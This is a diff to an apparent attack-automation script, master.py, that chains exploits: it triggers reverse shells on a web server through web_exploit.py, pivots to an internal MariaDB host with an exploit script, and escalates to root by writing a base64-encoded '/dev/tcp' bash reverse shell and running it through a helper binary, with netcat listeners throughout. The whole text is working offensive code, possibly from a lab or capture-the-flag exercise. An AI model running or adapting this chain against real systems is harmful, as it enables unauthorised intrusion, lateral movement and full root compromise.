@@ -27,17 +27,19 @@ def create_server():
 
 try:
     LHOST = sys.argv[1]
-    MARIADB_RHOST = sys.argv[2]
-    WEBSERVER_RHOST = sys.argv[3]
+    RHOST = sys.argv[2]
+    MARIADB_RHOST_INTERNAL = sys.argv[3]
+    WEBSERVER_RHOST_INTERNAL = sys.argv[4]
+
 except:
-    print("Usage: python master.py [LHOST] [MARIADB_RHOST] [WEBSERVER_RHOST]")
+    print("Usage: python master.py [LHOST] [RHOST] [MARIADB_RHOST_INTERNAL] [WEBSERVER_RHOST_INTERNAL]")
     sys.exit(1)
 
 def web_exploit(shell1, shell2):
     print("[!] triggering revshell connections on webserver")
-    system(f"python web_exploit.py http://{WEBSERVER_RHOST}:5000 {LHOST} 9998")
+    system(f"python web_exploit.py http://{RHOST}:5000 {LHOST} 9998")
     conn2 = shell2.wait_for_connection()
-    system(f"python web_exploit.py http://{WEBSERVER_RHOST}:5000 {LHOST} 9999")
+    system(f"python web_exploit.py http://{RHOST}:5000 {LHOST} 9999")
     conn1 = shell1.wait_for_connection()
     return conn1, conn2
 
@@ -46,7 +48,7 @@ def get_exploit_files(conn):
 
 def mariadb_exploit(conn1, conn2):
     conn2.sendline("nc -lnvp 9000")
-    conn1.sendline(f"python3 /tmp/mdb_exploit.py -H {MARIADB_RHOST} -l {WEBSERVER_RHOST}")
+    conn1.sendline(f"python3 /tmp/mdb_exploit.py -H {MARIADB_RHOST_INTERNAL} -l {WEBSERVER_RHOST_INTERNAL}")
     conn1.recvrepeat(timeout=6)
 
 def watchdog_exploit(conn):
@@ -60,7 +62,7 @@ def watchdog_exploit(conn):
 
 def root_revshell(conn1, conn2):
     conn1.sendline("nc -lnvp 9001")
-    payload = f"#!/bin/bash\nsh -i >&/dev/tcp/{WEBSERVER_RHOST}/9001 0>&1".encode()
+    payload = f"#!/bin/bash\nsh -i >&/dev/tcp/{WEBSERVER_RHOST_INTERNAL}/9001 0>&1".encode()
     conn2.sendline(f"echo {b64encode(payload).decode()} | base64 -d > /tmp/revshell.sh")
     conn2.sendline("chmod +x /tmp/revshell.sh")
     conn2.sendline(f"/tmp/wexp /tmp/revshell.sh")
